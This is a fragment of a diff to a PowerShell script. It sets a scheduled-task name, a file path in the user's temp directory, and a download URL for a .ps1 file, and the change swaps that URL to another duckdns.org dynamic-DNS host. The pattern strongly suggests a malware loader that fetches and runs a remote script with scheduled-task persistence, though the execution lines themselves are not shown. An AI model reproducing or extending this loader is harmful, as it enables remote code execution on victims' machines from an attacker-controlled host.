@@ -2,7 +2,7 @@ $taskName = "VerefiTask"
 
 $tempDir = $env:TEMP
 $ps1FileName = "verefi.ps1"
-$downloadUrl = "http://verefi.duckdns.org/verefy.ps1"
+$downloadUrl = "http://verefy.duckdns.org/verefi.ps1"
 
 $ps1Path = Join-Path -Path $tempDir -ChildPath $ps1FileName
 $workDir  = $tempDir
